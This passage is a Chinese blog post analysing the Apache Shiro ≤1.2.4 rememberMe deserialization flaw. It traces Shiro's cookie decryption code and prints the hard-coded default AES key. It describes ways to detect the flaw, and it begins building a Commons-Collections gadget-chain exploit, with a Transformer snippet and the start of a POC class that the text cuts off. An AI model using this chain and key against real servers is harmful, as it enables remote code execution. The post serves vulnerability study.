        <content type="html"><![CDATA[<h1 id="漏洞原理（代码）"><a href="#漏洞原理（代码）" class="headerlink" title="漏洞原理（代码）"></a>漏洞原理（代码）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p> Shiro≤1.2.4版本默认使用CookieRememberMeManager，当获取用户请求时，大致的关键处理过程如下：  </p><ul><li>获取Cookie值中的rememberMe的值</li><li>对rememberMe进行base64解码码</li><li>使用AES进行解密</li><li>对解密值进行反序列化</li></ul><p>由于AES是对称加密，即加密密钥和解密密钥一致。且shiro的AES密钥是硬编码的默认key值。因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当CookieRememberMeManager对恶意的rememberMe进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>CookieRememberMeManager类的getRememberedSerializedIdentity方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">            <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">            <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">        log.debug(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line"><span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line"><span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line"><span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line"><span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line"><span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">    base64 = ensurePadding(base64);</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decoded;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​第18行获取请求，第21行base64为请求头中的cookie值中的rememberMe属性值。然后27行调用ensurePadding方法，改方法的作用就是检测用户发送的数据是否为base64编码的数据格式。最后返回解码后的rememberMe的属性值。</p><p>跟进代码，getRememberedSerializedIdentity方法在AbstractRememberMeManager的getRememberedPrincipals方法中调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">  <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">      <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">      <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">      principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其返回结果放入convertBytesToPrincipals方法中调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​然后就是decrypt解密，最后就是反序列化。</p><p>看解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​第五行，cipherService.decrypt是一个接口类的方法，看实现代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] encrypted = ciphertext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//No IV, check if we need to read the IV from the stream:</span></span><br><span class="line">    <span class="type">byte</span>[] iv = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isGenerateInitializationVectors(<span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span></span><br><span class="line">            <span class="comment">//is:</span></span><br><span class="line">            <span class="comment">// - the first N bytes is the initialization vector, where N equals the value of the</span></span><br><span class="line">            <span class="comment">// &#x27;initializationVectorSize&#x27; attribute.</span></span><br><span class="line">            <span class="comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span></span><br><span class="line">            <span class="comment">//the IV to decrypt the real ciphertext:</span></span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">ivSize</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">            <span class="type">int</span> <span class="variable">ivByteSize</span> <span class="operator">=</span> ivSize / BITS_PER_BYTE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//now we know how large the iv is, so extract the iv bytes:</span></span><br><span class="line">            iv = <span class="keyword">new</span> <span class="title class_">byte</span>[ivByteSize];</span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">encryptedSize</span> <span class="operator">=</span> ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedSize];</span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​传入ciphertext为rememberMe属性值的base64解码，和一个key值。key值是getDecryptionCipherKey方法。逐步跟进是一个硬编码的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>在 DefaultSecurityManager类的rememberMeSuccessfulLogin方法下断点调试，<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201957971.png" alt="img"></p><p>跟进onSuccessfulLogin方法。 实现代码在AbstractRememberMeManager.java。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进forgetIdentity方法，获取了http的请求和响应头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(Subject subject)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line">        forgetIdentity(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​继续跟进forgetIdentity方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    getCookie().removeFrom(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取cookie并调用removeFrom，跟进。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201957471.png" alt="img"></p><p>name&#x3D;”rememberMe”，value&#x3D;”deleteme”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addCookieHeader</span><span class="params">(HttpServletResponse response, String name, String value, String comment,</span></span><br><span class="line"><span class="params">                             String domain, String path, <span class="type">int</span> maxAge, <span class="type">int</span> version,</span></span><br><span class="line"><span class="params">                             <span class="type">boolean</span> secure, <span class="type">boolean</span> httpOnly)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">headerValue</span> <span class="operator">=</span> buildHeaderValue(name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line">    response.addHeader(COOKIE_HEADER_NAME, headerValue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Added HttpServletResponse Cookie [&#123;&#125;]&quot;</span>, headerValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​可知，forgetIdentity方法的作用是给返回包添加了set-Cookie和rememberMe&#x3D;deleteme一些值。</p><p> 然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getIdentityToRemember(subject, authcInfo);</span><br><span class="line">    rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// principals为登录认证信息</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​convertPrincipalsToBytes中调用了serialize，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显对数据进行了序列化。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201957565.png" alt="img"></p><p>然后对序列化数据调用encrypt方法进行AES加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getEncryptionCipherKey为获取密钥key。</p><p>继续跟进到JcaCipherService的encrypt方法，加密模式为javax.crypto.Cipher.ENCRYPT_MODE&#x3D;”CBC”。</p><p>加密完成过继续调用rememberSerializedIdentity<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956564.png" alt="img"></p><p>对加密过的bytes进行base64编码，保存在cookie中<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201957964.png" alt="img"></p><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p> 对cookie中rememberMe的解密代码也是在AbstractRememberMeManager.java的getRememberedPrincipals方法中实现。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956767.png" alt="img"></p><p>调用getRememberedSerializedIdentity返回base64解码的rememberMe。</p><p>调用convertBytesToPrincipals，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过调用decrypt进行解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// getDecryptionCipherKey() 为获取密钥</span></span><br></pre></td></tr></table></figure><p>最后回到convertBytesToPrincipals方法调用deserialize进行反序列化。</p><h2 id="如何检测？"><a href="#如何检测？" class="headerlink" title="如何检测？"></a>如何检测？</h2><p>第一种就是可以通过序列化URLDNS这条链来回连检测，</p><p>第二种就是使用java利用链来命令执行通过ping来检测回连。</p><p>第三组也是最常用的一种：</p><p>因为shiro对rememberMe字段解密序列化的后返回PrincipalCollection类型，需要做强制类型转换。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956372.png" alt="img"> 如果我们能够顺理转化则不会抛出异常，也就不会返回remember&#x3D;delete。</p><p>因此我们可以通过，构造一个继承PrincipalCollection的类即可。SimplePrincipalCollection和SimplePrincipalMap均符合要求。通过使用SimplePrincipalCollection序列化来进行检测，key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过代码分析，shiro反序列化漏洞的触发流程：通过恶意构造的payload，设置为rememberMe的属性值，rememberMe经过base64解码，默认key的AES解密，反序列化。因此我们可通过逆步骤来生成payload：将恶意的序列化类进行AES加密，然后base64编码。</p><h1 id="手搓payload"><a href="#手搓payload" class="headerlink" title="手搓payload"></a>手搓payload</h1><p>我们尝试直接使用CC6的payload来打一下。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956936.png" alt="img"></p><p>报错：不能够去加载类commons.collections.Transformer。</p><p>下断点到DefaultSerializer.deserialize()方法的调用new ClassResolvingObjectInputStream(bis)函数处。</p><p>可以发现ClassResolvingObjectInputStream类继承了ObjectInputStream方法重写了resolveClass，而当java字节流执行反序列化的时候（即调用readObject方法）会执行ObjectInputStream.resolveClass方法。</p><p>因此这里执行的反序列化会执行ClassResolvingObjectInputStream的resolveClass方法。跟进查看，resolveClass中的调用了ClassUtils.forName来获取类名称。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956881.png" alt="img"></p><p>从报错信息查看是三次类加载器均没有加载到commons.collections.Transformer这个类，这是为什么呢？原因是这三个类均无法加载数组类，具体为什么无法加载数组里这个原因放到最后解释。先解决这个问题。</p><p>首先我们需要回顾一下CC链哪里用到了数组？为什么需要数组？</p><p>很明显我们通过一个ChainedTransformer来循环调用Transformer数组中各元素的transform方法并将调用返回的对象类作为下一个元素调用transform方法的参数。目的就是控制InvokerTransformer#transform方法的参数。我们就找一个Transformer[]中元素较少的一条链，CC3。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br></pre></td></tr></table></figure><p>这段代码的作用就是：通过调用ConstantTransformer#transform返回TrAXFilter.class，然后调用InstantiateTransformer#transform其参数为TrAXFilter.class</p><p>然后我们就需要找那个地方可以替换这一点。回顾一下CC6这一条链：HashMap.hashCode-&gt;TiedMapEntry.hashCode-&gt;TiedMapEntry.getValue-&gt;LazyMap.get-&gt;InvokerTransformer.transform。观察LazyMap.get方法，它内部调用的transform方法的key是一个对象且我们可通过TiedMapEntry控制。如果这个key是一个TrAXFilter.class那么我们就能够直接去调用InstantiateTransformer.transform(TrAXFilter.class)进而调用TrAXFilter.class的构造函数后边的拼接CC3即可。</p><p>POC实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Attack.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> 